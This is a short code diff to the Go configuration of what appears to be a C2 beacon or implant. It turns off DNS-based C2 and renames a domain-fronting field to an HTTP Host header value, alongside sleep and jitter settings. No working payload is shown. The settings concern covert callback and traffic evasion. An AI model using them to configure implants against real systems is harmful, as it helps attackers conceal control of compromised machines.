@@ -10,7 +10,7 @@ var (
 	Host = "https://ip:port"
 
 	// DNS config
-	IsDNS = true
+	IsDNS = false
 	// ServerBaseDomain is the base dns domain name, dot is required
 	ServerBaseDomain = ".test.unknown."
 	// DnsServer is C2 server addr ip:53
@@ -39,8 +39,8 @@ var (
 	EndTime    = ""
 	// proxy config
 	ProxyUrl = ""
-	// domain fronting host
-	DomainFrontHost = ""
+	// value in http header Host
+	HostName = ""
 	// WaitTime unit Millisecond
 	WaitTime = 5 * 1000
 	// Jitter unit percent
